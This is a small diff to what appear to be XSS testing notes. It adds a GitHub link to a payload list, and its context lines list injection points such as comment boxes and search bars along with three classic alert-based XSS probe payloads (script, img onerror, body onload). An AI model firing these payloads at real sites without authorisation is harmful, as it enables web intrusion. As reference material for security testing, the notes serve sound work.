@@ -87,6 +87,7 @@ o	Comment boxes , search bar’s etc..
 #payloads
 https://xssnow.in/payloads.html
 https://github.com/devspidr/XSS_payloads_list
+https://github.com/yassinmohamed1111/superxss/blob/main/README.md
 %00<script>alert(1)</script>
 <img src=x onerror=alert(1)>
 <body onload=alert('XSS')>
